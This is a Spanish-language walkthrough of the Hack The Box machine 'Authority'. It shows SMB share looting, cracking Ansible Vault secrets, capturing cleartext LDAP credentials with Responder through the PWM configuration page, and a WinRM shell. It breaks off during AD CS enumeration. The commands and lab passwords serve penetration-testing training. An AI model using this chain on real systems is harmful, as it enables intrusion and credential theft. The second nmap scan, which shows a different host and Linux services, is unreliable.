---
title: Authority
description: Máquina Authority de Hackthebox
date: 2024-10-02 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Windows
tags:
  - SMB Enumeration
  - Ansible Vault Hash Cracking (ansible2john)
  - Abusing PWM (Password Self Service)
  - Abusing WinRM
  - DC Enumeration (adPEAS)
  - Creating Domain Computer (addcomputer.py)
  - ESC1 exploitation usilng certipy [Privilege Escalation]
  - Authenticate over LDAP(S) - Split PFX into certificate and key for LDAP(S) authentication with certipy (certipy)
  - PassTheCert with Schannel against LDAP(S) - Use PassTheCert to gain Administrator shell via Schannel authentication over LDAP(S)
  - Create User and Add to Domain Admins using PassTheCert
  - PassTheHash (Psexec)
image:
  path: /assets/img/Authority/Authority.png
---

## Skills

- SMB Enumeration
- Ansible Vault Hash Cracking (ansible2john)
- Abusing PWM (Password Self Service)
- Abusing WinRM
- DC Enumeration (adPEAS)
- Creating Domain Computer (addcomputer.py)
- ESC1 exploitation case with certipy [Privilege Escalation]
- Authenticate over LDAP(S) - Split PFX into certificate and key for LDAP(S) authentication with certipy (certipy)
- PassTheCert with Schannel against LDAP(S) - Use PassTheCert to gain Administrator shell via Schannel authentication over LDAP(S)
- Create User and Add to Domain Admins with PassTheCert
- PassTheHash (Psexec)

## Certificaciones

- OSCP
- OSEP
- eCPPTv3
  
## Descripción

`authority` es una máquina `medium windows`, destaca los peligros de las `malas configuraciones`, la `reutilización de contraseñas`, el `almacenamiento de credenciales en recursos compartidos`, y cómo las `configuraciones predeterminadas en Active Directory` (como la capacidad de que todos los usuarios del dominio puedan agregar hasta 10 computadoras al dominio) pueden combinarse con otros fallos de seguridad (como las `plantillas de certificados vulnerables de AD CS`) para tomar el control de un dominio

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping -c 3 10.129.229.56
PING 10.129.229.56 (10.129.229.56) 56(84) bytes of data.
64 bytes from 10.129.229.56: icmp_seq=1 ttl=127 time=36.4 ms
64 bytes from 10.129.229.56: icmp_seq=2 ttl=127 time=36.0 ms
64 bytes from 10.129.229.56: icmp_seq=3 ttl=127 time=36.1 ms

--- 10.129.229.56 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 36.046/36.167/36.402/0.165 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap

```
# sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.229.56 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 06:52 CEST
Initiating SYN Stealth Scan at 06:52
Scanning 10.129.229.56 [65535 ports]
Discovered open port 139/tcp on 10.129.229.56
Discovered open port 135/tcp on 10.129.229.56
Discovered open port 445/tcp on 10.129.229.56
Discovered open port 80/tcp on 10.129.229.56
Discovered open port 53/tcp on 10.129.229.56
Discovered open port 49673/tcp on 10.129.229.56
Discovered open port 49691/tcp on 10.129.229.56
Discovered open port 47001/tcp on 10.129.229.56
Discovered open port 49693/tcp on 10.129.229.56
Discovered open port 49664/tcp on 10.129.229.56
Discovered open port 49703/tcp on 10.129.229.56
Discovered open port 3268/tcp on 10.129.229.56
Discovered open port 8443/tcp on 10.129.229.56
Discovered open port 49667/tcp on 10.129.229.56
Discovered open port 5985/tcp on 10.129.229.56
Discovered open port 49665/tcp on 10.129.229.56
Discovered open port 49666/tcp on 10.129.229.56
Discovered open port 636/tcp on 10.129.229.56
Discovered open port 49694/tcp on 10.129.229.56
Discovered open port 60183/tcp on 10.129.229.56
Discovered open port 49690/tcp on 10.129.229.56
Discovered open port 9389/tcp on 10.129.229.56
Discovered open port 49714/tcp on 10.129.229.56
Discovered open port 389/tcp on 10.129.229.56
Discovered open port 3269/tcp on 10.129.229.56
Discovered open port 464/tcp on 10.129.229.56
Discovered open port 593/tcp on 10.129.229.56
Discovered open port 88/tcp on 10.129.229.56
Completed SYN Stealth Scan at 06:52, 14.75s elapsed (65535 total ports)
Nmap scan report for 10.129.229.56
Host is up (0.072s latency).
Not shown: 63615 closed tcp ports (reset), 1892 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49693/tcp open  unknown
49694/tcp open  unknown
49703/tcp open  unknown
49714/tcp open  unknown
60183/tcp open  unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
           Raw packets sent: 77634 (3.416MB) | Rcvd: 63643 (2.546MB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p 22,80,1883,5672,8161,46821,61613,61614,61616 10.129.137.211 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 19:08 CEST
Nmap scan report for 10.129.137.211
Host is up (0.091s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
46821/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.94SVN%I=7%D=10/7%Time=670415B7%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x
SF:10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\
SF:x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20
SF:client\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,
SF:"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\
SF:xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M
SF:\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using
SF:\x20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0
SF:\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0
SF:\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amq
SF:p:decode-error\xa17Connection\x20from\x20client\x20using\x20unsupported
SF:\x20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0
SF:\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`
SF:\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa1
SF:7Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attemp
SF:ted")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x
SF:19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0
SF:\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Conne
SF:ction\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%
SF:r(DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\
SF:0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S
SF:\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x
SF:20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSe
SF:ssionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\
SF:xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01
SF:\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cli
SF:ent\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCook
SF:ie,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0
SF:c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1
SF:d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x2
SF:0using\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.94SVN%I=7%D=10/7%Time=670415B2%P=x86_64-pc-linux-gnu%
SF:r(HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20ST
SF:OMP\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Prot
SF:ocolException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apa
SF:che\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Pro
SF:tocolConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.s
SF:tomp\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\
SF:n\tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\
SF:(TransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\
SF:.tcp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apach
SF:e\.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\
SF:)\n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61616-TCP:V=7.94SVN%I=7%D=10/7%Time=670415B2%P=x86_64-pc-linux-gnu%
SF:r(NULL,140,"\0\0\x01<\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\x
SF:11TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize\
SF:x05\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled\
SF:x01\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x1
SF:4TightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\
SF:x15MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationIn
SF:italDelay\x06\0\0\0\0\0\0'\x10\0\x0fProviderVersion\t\0\x075\.15\.15");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.90 seconds
```

### Smb Enumeration

`Obtenemos` el `nombre` de la `máquina` y el `dominio`

```
# netexec smb 10.129.229.56 -u 'guest' -p ''           
SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019 Build 17763 x64 (name:authority) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.56   445    authority        [+] authority.htb\guest: 
```

`Agregamos` el `dominio` y el `nombre` de la `máquina` al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       kali-linux
10.129.229.56   authority.htb  authority

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

`Listamos` recursos compartidos por `smb`

```
# netexec smb 10.129.229.56 -u 'guest' -p '' --shares  
SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019 Build 17763 x64 (name:authority) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.56   445    authority        [+] authority.htb\guest: 
SMB         10.129.229.56   445    authority        [*] Enumerated shares
SMB         10.129.229.56   445    authority        Share           Permissions     Remark
SMB         10.129.229.56   445    authority        -----           -----------     ------
SMB         10.129.229.56   445    authority        ADMIN$                          Remote Admin
SMB         10.129.229.56   445    authority        C$                              Default share
SMB         10.129.229.56   445    authority        Department Shares                 
SMB         10.129.229.56   445    authority        Development     READ            
SMB         10.129.229.56   445    authority        IPC$            READ            Remote IPC
SMB         10.129.229.56   445    authority        NETLOGON                        Logon server share 
SMB         10.129.229.56   445    authority        SYSVOL                          Logon server share 
```

Nos conectamos con `smbclient` y nos `descargamos` en nuestro equipo todos los `recursos` `compartidos` por `smb`

```
# smbclient -N //10.129.229.56/Development
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 17 14:20:38 2023
  ..                                  D        0  Fri Mar 17 14:20:38 2023
  Automation                          D        0  Fri Mar 17 14:20:40 2023

		5888511 blocks of size 4096. 1190804 blocks available
smb: \> PROMPT OFF
smb: \> RECURSE ON
smb: \> mget *
smb: \> exit
```

Estos tres `hashes` nos los vamos a `guardar` cada uno en un `archivo distinto`, el archivo se encuentra en la carpeta `Defaults`

{% raw %}
```
# cat main.yml                   
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764 
```
{% endraw %}

Se vería de esta manera

```
# cat hash_1.yml      
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438

# cat hash_2.yml 
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531

# cat hash_3.yml  
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
```

Usamos `john` para romper el `hash`, el `hash` es el `mismo` en los `tres archivos`

```
# john -w:/usr/share/wordlists/rockyou.txt hash_1.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 XOP 4x2])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (hash_1.yml)     
1g 0:00:00:21 DONE (2024-10-09 07:51) 0.04570g/s 1820p/s 1820c/s 1820C/s 051790..teamol
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`Desencriptamos` el `mensaje` de cada texto hasheado

```
# ansible-vault decrypt hash_1.yml --output hash_1_decrypted.txt
Vault password: 
Decryption successful

# ansible-vault decrypt hash_2.yml --output hash_2_decrypted.txt
Vault password: 
Decryption successful

# ansible-vault decrypt hash_3.yml --output hash_3_decrypted.txt
Vault password: 
Decryption successful
```

`Obtenemos` lo que parece ser un `usuario` y dos `contraseñas`

```
# cat hash_1_decrypted.txt 
svc_pwm                                                                                                                                
# cat hash_2_decrypted.txt 
pWm_@dm!N_!23                                                                                                                                
# cat hash_3_decrypted.txt 
DevT3st@123 
```

### Web Enumeration

Si accedemos a `https://10.129.144.88:8443/` vemos esto

![](/assets/img/Authority/image_1.png)

![](/assets/img/Authority/image_2.png)

Pinchamos en `Configuration Editor` y nos logueamos

![](/assets/img/Authority/image_3.png)

## Web Exploitation

Una vez dentro pulsamos en `LDAP` y en `Connection` 

![](/assets/img/Authority/image_4.png)

Pinchamos en `Add Value`

![](/assets/img/Authority/image_5.png)

`Modificamos` el `valor`, ponemos nuestra `ip`, el `puerto` por `defecto` de `ldap` y usamos `ldap` en vez de `ldaps` para que el `tràfico` no esté `cifrado`

![](/assets/img/Authority/image_6.png)

Pulsamos en `Save` y nos ponemos en `escucha` con el `responder`

```
# responder -I tun0
```

Pulsamos en `Test LDAP Profile` y `capturamos` una `autenticación`

```
# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.28]
    Responder IPv6             [dead:beef:4::101a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-SDQK2HOGA5Y]
    Responder Domain Name      [DMGV.LOCAL]
    Responder DCE-RPC Port     [46521]

[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[+] Exiting...
```

## Intrusión

`Validamos` las `credenciales`

```
# netexec winrm 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'               
WINRM       10.129.229.56   5985   authority        [*] Windows 10 / Server 2019 Build 17763 (name:authority) (domain:authority.htb)
WINRM       10.129.229.56   5985   authority        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

Nos `conectamos` a la `máquina víctima`

```
# evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
                                        
Evil-WinRM shell v3.6
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami
htb\svc_ldap
```

## Privilege Escalation

`Enumeramos` los `grupos` y `privilegios` de nuestro usuario, el grupo `Certificate Service DCOM Access` me llama la atención

```
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT authority\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT authority\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT authority\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT authority\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Nos `descargamos` [https://github.com/61106960/adPEAS.git](https://github.com/61106960/adPEAS.git), nos conectamos a través de `winrm` a la máquina víctima desde el `mismo directorio` donde se encuentran los binarios `.ps1` y subimos `adPEAS.ps1` a la máquina víctima

```
# evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
                                        
Evil-WinRM shell v3.6
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> upload adPEAS.ps1
                                        
Info: Uploading /home/justice-reaper/Desktop/Authorityscripts/adPEAS/adPEAS.ps1 to C:\Users\svc_ldap\Documents\adPEAS.ps1
                                        
Data: 4655524 bytes of 4655524 bytes copied
                                        
Info: Upload successful!
```

`Importamos` el `módulo`

```
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Import-Module .\adPEAS.ps1
```

`Ejecutamos` el `script`

```
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Invoke-adPEAS

               _ _____  ______           _____
              | |  __ \|  ____|   /\    / ____|
      ____  __| | |__) | |__     /  \  | (___
     / _  |/ _  |  ___/|  __|   / /\ \  \___ \
    | (_| | (_| | |    | |____ / ____ \ ____) |
     \__,_|\__,_|_|    |______/_/    \_\_____/
                                            Version 0.8.24

    Active Directory Enumeration
    by @61106960

    Legend
        [?] Searching for juicy information
        [!] Found a vulnerability which may can be exploited in some way
        [+] Found some interesting information for further investigation
        [*] Some kind of note
        [#] Some kind of secure configuration


[?] +++++ Searching for Juicy Active Directory Information +++++

[?] +++++ Checking General Domain Information +++++
[+] Found general Active Directory domain information for domain 'authority.htb':
Domain Name:				authority.htb
Domain SID:				S-1-5-21-622327497-3269355298-2248959698
Domain Functional Level:		Windows 2016
Forest Name:				authority.htb
Forest Children:			No Subdomain[s] available
Domain Controller:			authority.authority.htb

[?] +++++ Checking Domain Policies +++++
[+] Found password policy of domain 'authority.htb':
Minimum Password Age:			1 days
[!] Maximum Password Age:		Disabled
[+] Minimum Password Length:		7 character
Password Complexity:			Enabled
[!] Lockout Account:			Disabled
Reversible Encryption:			Disabled
[+] Found Kerberos policy of domain 'authority.htb':
Maximum Age of TGT:			10 hours
Maximum Age of TGS:			600 minutes
Maximum Clock Time Difference:		5 minutes
Krbtgt Password Last Set:		08/09/2022 18:54:01

[?] +++++ Checking Domain Controller, Sites and Subnets +++++
[+] Found domain controller of domain 'authority.htb':
DC Host Name:				authority.authority.htb
DC Roles:				SchemaRole,NamingRole,PdcRole,RidRole,InfrastructureRole
DC IP Address:				fe80::fbc2:bc9c:bc53:aff9%8
Site Name:				Default-First-Site-Name


[?] +++++ Checking Forest and Domain Trusts +++++

[?] +++++ Checking Juicy Permissions +++++

[?] +++++ Checking NetLogon Access Rights +++++

[?] +++++ Checking Add-Computer Permissions +++++
[+] Filtering found identities that can add a computer object to domain 'authority.htb':
[!] The Machine Account Quota is currently set to 10
[!] Every member of group 'Authenticated Users' can add a computer to domain 'authority.htb'

distinguishedName:			CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=authority,DC=htb
objectSid:				S-1-5-11
memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb
					CN=Certificate Service DCOM Access,CN=Builtin,DC=authority,DC=htb
					CN=Users,CN=Builtin,DC=authority,DC=htb
 

[?] +++++ Checking DCSync Permissions +++++
[+] Filtering found identities that can perform DCSync in domain 'authority.htb':

[?] +++++ Checking LAPS Permissions +++++

[?] +++++ Searching for GPO local group membership Information +++++

[?] +++++ Searching for Active Directory Certificate Services Information +++++
[+] Found at least one available Active Directory Certificate Service
adPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2

[+] Found Active Directory Certificate Services 'authority-CA':
CA Name:				authority-CA
CA dnshostname:				authority.authority.htb
CA IP Address:				10.129.229.56
